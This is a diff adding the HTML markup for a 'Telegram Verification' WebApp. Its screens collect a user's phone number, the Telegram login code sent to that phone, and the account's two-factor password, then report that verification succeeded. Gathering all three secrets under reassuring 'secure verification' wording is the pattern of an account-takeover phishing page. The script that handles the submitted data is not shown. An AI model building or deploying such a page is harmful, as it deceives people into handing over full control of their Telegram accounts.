@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Verification</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🔐</div>
+            <h1>Telegram Verification</h1>
+            <p>Secure account verification system</p>
+        </div>
+
+        <div class="main-content">
+            <div id="welcome-screen" class="screen active">
+                <div class="icon">👋</div>
+                <h2>Welcome</h2>
+                <p class="description">
+                    This WebApp helps verify your Telegram account securely.
+                    No messages will be sent to you in the chat.
+                </p>
+                <button class="btn-primary" onclick="startVerification()">
+                    Start Verification
+                </button>
+            </div>
+
+            <div id="phone-screen" class="screen">
+                <div class="icon">📱</div>
+                <h2>Phone Number</h2>
+                <p class="description">
+                    Enter your phone number with country code
+                </p>
+                
+                <div class="input-group">
+                    <select id="country-code" class="country-select">
+                        <option value="+1">🇺🇸 +1</option>
+                        <option value="+91">🇮🇳 +91</option>
+                        <option value="+44">🇬🇧 +44</option>
+                        <option value="+7">🇷🇺 +7</option>
+                        <option value="+86">🇨🇳 +86</option>
+                        <option value="+81">🇯🇵 +81</option>
+                        <option value="+33">🇫🇷 +33</option>
+                        <option value="+49">🇩🇪 +49</option>
+                        <option value="+55">🇧🇷 +55</option>
+                        <option value="+20">🇪🇬 +20</option>
+                    </select>
+                    <input type="tel" id="phone-number" class="phone-input" 
+                           placeholder="Enter phone number" maxlength="15">
+                </div>
+                
+                <div id="phone-error" class="error-message"></div>
+                
+                <div class="button-group">
+                    <button class="btn-secondary" onclick="goToScreen('welcome')">
+                        Back
+                    </button>
+                    <button class="btn-primary" onclick="sendOTP()">
+                        Send OTP
+                    </button>
+                </div>
+            </div>
+
+            <div id="otp-screen" class="screen">
+                <div class="icon">🔢</div>
+                <h2>Enter OTP</h2>
+                <p class="description" id="otp-description">
+                    Enter the 5-digit code sent to your phone
+                </p>
+                
+                <div class="otp-container">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="1">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="2">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="3">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="4">
+                    <input type="text" class="otp-digit" maxlength="1" data-index="5">
+                </div>
+                
+                <div id="otp-error" class="error-message"></div>
+                
+                <div class="timer" id="timer">
+                    Resend OTP in <span id="countdown">120</span>s
+                </div>
+                
+                <div class="button-group">
+                    <button class="btn-secondary" onclick="goToScreen('phone')">
+                        Change Number
+                    </button>
+                    <button class="btn-primary" onclick="verifyOTP()" id="verify-btn">
+                        Verify
+                    </button>
+                    <button class="btn-link" onclick="resendOTP()" id="resend-btn" disabled>
+                        Resend OTP
+                    </button>
+                </div>
+            </div>
+
+            <div id="password-screen" class="screen">
+                <div class="icon">🔐</div>
+                <h2>2FA Password</h2>
+                <p class="description">
+                    Your account has two-factor authentication enabled
+                </p>
+                
+                <input type="password" id="password" class="password-input" 
+                       placeholder="Enter 2FA password">
+                
+                <div id="password-error" class="error-message"></div>
+                
+                <div class="button-group">
+                    <button class="btn-secondary" onclick="goToScreen('otp')">
+                        Back
+                    </button>
+                    <button class="btn-primary" onclick="verifyPassword()">
+                        Verify
+                    </button>
+                </div>
+            </div>
+
+            <div id="success-screen" class="screen">
+                <div class="icon success-icon">✅</div>
+                <h2>Verification Complete!</h2>
+                <p class="description">
+                    Your Telegram account has been verified successfully.
+                </p>
+                <div class="success-details">
+                    <p><strong>Status:</strong> Verified</p>
+                    <p><strong>Time:</strong> <span id="verification-time"></span></p>
+                </div>
+                <button class="btn-primary" onclick="closeWebApp()">
+                    Close
+                </button>
+            </div>
+
+            <div id="loading-screen" class="screen">
+                <div class="spinner"></div>
+                <h2 id="loading-text">Processing...</h2>
+                <p id="loading-description">Please wait</p>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p class="disclaimer">
+                <small>
+                    This WebApp is for verification purposes only.
+                    No messages will be sent to your chat.
+                </small>
+            </p>
+        </div>
+    </div>
+
+    <script src="/static/js/script.js"></script>
+</body>
+              </html>
